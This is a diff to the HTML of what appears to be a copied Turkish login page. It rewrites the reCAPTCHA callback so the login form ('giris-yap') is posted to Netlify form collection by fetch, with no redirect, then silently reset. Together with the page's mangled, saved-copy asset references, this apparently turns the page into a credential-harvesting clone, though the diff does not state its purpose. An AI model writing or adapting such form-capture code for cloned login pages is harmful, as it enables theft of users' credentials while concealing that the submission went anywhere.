@@ -27,9 +27,37 @@
         gtag('config', 'G-BNMXQCZE7S');
     </script>
 <script async="" defer="" src="api.js" type="text/javascript"></script><script type="text/javascript">
-        function biscolabLaravelReCaptcha(token) {
-            document.getElementById("biscolab-recaptcha-invisible-form").submit();
-        }
+        
+function biscolabLaravelReCaptcha(token) {
+  var form = document.getElementById("biscolab-recaptcha-invisible-form");
+  if (!form) { return; }
+  // Ensure token is present as g-recaptcha-response
+  var t = form.querySelector('input[name="g-recaptcha-response"]');
+  if (!t) {
+    t = document.createElement('input');
+    t.type = 'hidden';
+    t.name = 'g-recaptcha-response';
+    form.appendChild(t);
+  }
+  t.value = token;
+
+  var fd = new FormData(form);
+  if (!fd.has("form-name")) fd.append("form-name", "giris-yap");
+
+  // Submit to same page via fetch to avoid redirect/page-not-found
+  fetch("/", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams(fd).toString()
+  }).then(function() {
+    // optional: no redirect; you can show a subtle 'submitted' toast if you want
+    try { form.reset(); } catch(e) {}
+    console.log("Netlify: submission sent (no redirect).");
+  }).catch(function(err){
+    console.error("Netlify submission failed:", err);
+  });
+}
+
     </script>
 <link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit"></script>
 <script>
